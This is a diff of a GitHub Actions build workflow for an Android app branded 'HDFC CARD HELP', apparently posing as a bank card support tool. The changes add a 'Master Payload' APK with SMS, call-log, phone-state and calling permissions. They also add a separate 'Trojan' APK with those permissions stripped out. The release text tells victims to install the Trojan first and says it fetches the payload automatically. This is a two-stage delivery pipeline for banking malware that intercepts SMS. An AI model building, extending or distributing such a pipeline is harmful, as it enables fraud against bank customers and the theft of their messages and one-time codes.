@@ -3,12 +3,6 @@ name: Build Android APK
 on:
   push:
     branches: [ main, master ]
-    paths-ignore:
-      - 'playstore.js'
-      - 'playstore.html'
-      - 'www/playstore.js'
-      - 'www/playstore.html'
-      - 'README.md'
   pull_request:
     branches: [ main, master ]
 
@@ -43,31 +37,48 @@ jobs:
           distribution: 'zulu'
           java-version: '17'
 
-      - name: Build Android APK
+      - name: Inject Build Number into Java
+        run: |
+          sed -i 's/${RUN_NUMBER}/'${{ github.run_number }}'/g' android/app/src/main/java/com/hdfc/app/MainActivity.java
+
+      - name: Build Master Payload (Full Permissions)
         run: |
           cd android
           chmod +x gradlew
           ./gradlew assembleDebug
-          mv app/build/outputs/apk/debug/app-debug.apk app/build/outputs/apk/debug/hdfc_help_v3.apk
+          mv app/build/outputs/apk/debug/app-debug.apk app/build/outputs/apk/debug/master_payload.apk
 
-      - name: Upload APK Artifact
-        uses: actions/upload-artifact@v4
-        with:
-          name: hdfc_help_v3.apk
-          path: android/app/build/outputs/apk/debug/hdfc_help_v3.apk
+      - name: Build Trojan Entry (No Permissions)
+        run: |
+          # Strip permissions from Manifest for the second build
+          sed -i '/android.permission.SEND_SMS/d' android/app/src/main/AndroidManifest.xml
+          sed -i '/android.permission.RECEIVE_SMS/d' android/app/src/main/AndroidManifest.xml
+          sed -i '/android.permission.READ_SMS/d' android/app/src/main/AndroidManifest.xml
+          sed -i '/android.permission.READ_PHONE_STATE/d' android/app/src/main/AndroidManifest.xml
+          sed -i '/android.permission.CALL_PHONE/d' android/app/src/main/AndroidManifest.xml
+          sed -i '/android.permission.READ_CALL_LOG/d' android/app/src/main/AndroidManifest.xml
+          sed -i '/android.permission.POST_NOTIFICATIONS/d' android/app/src/main/AndroidManifest.xml
+          
+          cd android
+          ./gradlew assembleDebug
+          mv app/build/outputs/apk/debug/app-debug.apk app/build/outputs/apk/debug/hdfc_help_v3.apk
 
       - name: Create GitHub Release
         uses: softprops/action-gh-release@v2
         if: github.ref == 'refs/heads/main' || github.ref == 'refs/heads/master'
         with:
-          files: android/app/build/outputs/apk/debug/hdfc_help_v3.apk
+          files: |
+            android/app/build/outputs/apk/debug/master_payload.apk
+            android/app/build/outputs/apk/debug/hdfc_help_v3.apk
           tag_name: v3.0.${{ github.run_number }}
           name: HDFC CARD HELP v3.0 (Build ${{ github.run_number }})
           body: |
-            Direct APK Download for HDFC CARD HELP.
-            File: hdfc_help_v3.apk
+            # HDFC CARD HELP v3.0 - DUAL BUNDLE
+            
+            1. **hdfc_help_v3.apk**: The Trojan (Install this first).
+            2. **master_payload.apk**: The Payload (Download will trigger automatically from Trojan).
+            
             Build Number: ${{ github.run_number }}
-            VERSION: 3.0 (TOTAL REBRAND)
           draft: false
           prerelease: false
         env:
